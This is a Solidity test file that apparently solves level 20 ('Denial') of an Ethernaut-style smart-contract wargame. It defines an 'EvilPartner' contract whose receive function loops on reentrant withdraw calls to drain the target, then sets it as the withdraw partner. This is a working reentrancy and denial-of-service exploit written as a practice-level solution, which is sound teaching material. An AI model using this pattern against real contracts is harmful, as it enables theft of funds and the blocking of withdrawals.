// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {DenialFactory} from "../src/levels/20-DenialFactory.sol";
import {Denial} from "../src/levels/20-Denial.sol";

contract EvilPartner {
  uint256 private amountToSendToOwner;

  receive() external payable {
    if (amountToSendToOwner == 0 ) {
      amountToSendToOwner = msg.value;
    }
    while(msg.sender.balance > amountToSendToOwner) {
      Denial(payable(msg.sender)).withdraw();
    }
  }
}

contract DenialSolution is BaseTest {

    function solution(address payable target_) internal override{
        Denial target = Denial(target_);
        EvilPartner attacker = new EvilPartner();
        target.setWithdrawPartner(address(attacker));
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new DenialFactory()));
    }
}
